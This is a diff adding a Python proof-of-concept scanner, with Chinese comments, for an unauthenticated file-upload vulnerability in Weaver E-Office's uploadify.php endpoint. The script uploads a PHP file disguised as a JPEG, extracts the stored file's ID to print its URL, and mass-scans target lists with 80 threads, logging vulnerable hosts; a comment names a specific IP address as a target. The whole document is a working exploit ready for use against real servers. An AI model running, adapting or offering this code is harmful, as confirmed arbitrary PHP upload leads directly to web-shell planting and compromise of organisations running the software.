@@ -1,0 +1,84 @@
+import requests,argparse,re,json
+from multiprocessing.dummy import Pool  
+requests.packages.urllib3.disable_warnings()  # 解除警告  url为http://183.67.37.242:8009
+proxies={
+
+        'http':'http://127.0.0.1:8080',
+        'https':'http://127.0.0.1:8080'
+    }
+  
+GREEN = '\033[92m'  
+RESET = '\033[0m'    
+def banner():  
+    text = '''  
+.----------------.  .----------------.  .----------------.  .----------------.  .----------------.   
+| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |  
+| |  ________    | || |      __      | || |  ____  ____  | || | _____  _____ | || |      __      | |  
+| | |_   ___ `.  | || |     /  \     | || | |_   ||   _| | || ||_   _||_   _|| || |     /  \     | |  
+| |   | |   `. \ | || |    / /\ \    | || |   | |__| |   | || |  | |    | |  | || |    / /\ \    | |  
+| |   | |    | | | || |   / ____ \   | || |   |  __  |   | || |  | '    ' |  | || |   / ____ \   | |  
+| |  _| |___.' / | || | _/ /    \ \_ | || |  _| |  | |_  | || |   \ `--' /   | || | _/ /    \ \_ | |  
+| | |________.'  | || ||____|  |____|| || | |____||____| | || |    `.__.'    | || ||____|  |____|| |  
+| |              | || |              | || |              | || |              | || |              | |  
+| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |  
+ '----------------'  '----------------'  '----------------'  '----------------'  '----------------'   
+'''  
+    print(text)  
+  
+def poc(target):  
+    url = target + '/inc/jquery/uploadify/uploadify.php'  
+    headers = {  
+        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36',
+        'Connection':'close',
+        'Content-Length':'259',
+        'Content-Type':'multipart/form-databoundary=e64bdf16c554bbc109cecef6451c26a4',
+        'Accept-Encoding':'gzip'
+
+    } 
+
+    data="""
+--e64bdf16c554bbc109cecef6451c26a4
+Content-Disposition: form-data; name="Filedata";filename="2TrZmO0y0SU34qUcUGHA8EXiDgN.php"
+Content-Type: image/jpeg
+<?php echo "2TrZmO0y0SU34qUcUGHA8EXiDgN";unlink(__FILE__);?>--e64bdf16c554bbc109cecef6451c26a4--"""
+    
+
+    
+    try:  
+        res = requests.post(url=url, headers=headers, timeout=10,data=data, verify=False, proxies=proxies)  
+        if res.status_code == 200:  
+            # 使用正则表达式查找响应体中的10位数字  
+            match = re.search(r'\b\d{10}\b', res.text)  
+            if match:  
+                # 如果找到，将匹配的数字存储在变量中  
+                ten_digit_number = match.group()  
+                print(f'{GREEN}[+]文件上传检测:该网站存在文件上传漏洞,url为{target}, 访问链接{target}/attachment/{ten_digit_number}/2TrZmO0y0SU34qUcUGHA8EXiDgN.php{RESET}')  
+                with open('result.txt', 'a') as f:  
+                    f.write(f'{target} - 检测到可能的文件ID: {ten_digit_number}\n')
+            else:  
+                print(f'[-]不存在文件上传:url为{target}, 但未检测到10位数字')  
+        else:  
+            print(f'[-]HTTP状态码不是200: {res.status_code} for {target}')  
+    except Exception as e:  
+        print(f'[*]{target} 出错: {e}')  
+  
+def main():  
+    parser = argparse.ArgumentParser(description="泛微E-Office uploadify.php后台文件上传漏洞")  
+    parser.add_argument('-u', '--url', dest='url', type=str, help="输入单个URL")  
+    parser.add_argument('-f', '--file', dest='file', type=str, help="输入包含URL的文件路径")  
+    args = parser.parse_args()  
+  
+    if args.url and not args.file:  # 处理单个URL  
+        poc(args.url)  
+    elif args.file and not args.url:
+        url_list =[]
+        with open(args.file,'r',encoding='utf-8') as fp:
+            for i in fp.readlines():
+                url_list.append(i.strip().replace('\n',''))
+        mp =Pool(80)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join() 
+
+if __name__ == '__main__':
+    main()
